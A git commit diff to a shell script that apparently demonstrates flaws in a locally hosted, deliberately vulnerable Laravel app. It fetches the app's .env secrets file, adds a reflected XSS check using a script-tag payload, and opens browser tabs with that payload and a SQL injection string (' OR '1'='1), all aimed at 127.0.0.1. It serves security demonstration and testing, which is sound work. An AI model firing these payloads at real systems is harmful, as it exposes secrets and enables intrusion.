057bbed7e13b773ec1da9bffc0cfa89153f75e79
alex-nightvision <alex@nightvision.net>
2024-05-06 12:12:38 -0400

    add XSS in check

--- check-endpoint.sh
+++ check-endpoint.sh
@@ -8,8 +8,14 @@ echo "==========================================="
 echo "Laravel - Sensitive Information Disclosure"
 echo 'curl http://127.0.0.1:8999/.env'
 echo
-curl http://127.0.0.1:8999/.env
-
+curl "http://127.0.0.1:8999/.env"
+echo "==========================================="
+echo "XSS REFLECTION"
+echo "http://127.0.0.1:8999/Users/search?name=<script>alert()</script>"
+echo
+curl "http://127.0.0.1:8999/Users/search?name=<script>alert()</script>"
+echo
 read
 open -a Google\ Chrome "http://127.0.0.1:8999/.env" &
 open -a Google\ Chrome "http://127.0.0.1:8999/Users?name='%20OR%20'1'='1" &
+open -a Google\ Chrome "http://127.0.0.1:8999/Users/search?name=<script>alert()</script>"
